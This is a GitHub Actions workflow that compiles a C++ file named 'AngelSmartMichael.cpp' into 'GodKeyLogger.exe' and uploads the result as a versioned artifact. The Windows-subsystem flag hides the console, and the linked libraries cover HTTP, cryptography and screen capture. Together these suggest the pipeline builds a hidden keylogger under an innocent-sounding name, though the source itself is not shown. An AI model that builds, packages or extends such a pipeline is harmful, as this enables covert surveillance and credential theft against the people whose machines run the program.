name:  Build Angel Smart Michael

on: 
  push:
    paths: ['AngelSmartMichael.cpp']  # Only build when source changes
  pull_request:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1
      
    - name: Compile Angel Smart Michael
      shell: cmd
      run: |
        cl /EHsc /O2 /MT AngelSmartMichael.cpp /link /SUBSYSTEM:WINDOWS /OUT:GodKeyLogger.exe user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib gdiplus.lib shell32.lib comctl32.lib
        
    - name: Verify Build
      shell: cmd
      run: dir GodKeyLogger.exe
      
    - name: Upload Artifact
      uses: actions/upload-artifact@v4
      with:
        name: ðŸ‘¼ AngelSmartMichael-v5.0
        path: GodKeyLogger.exe
        retention-days: 30
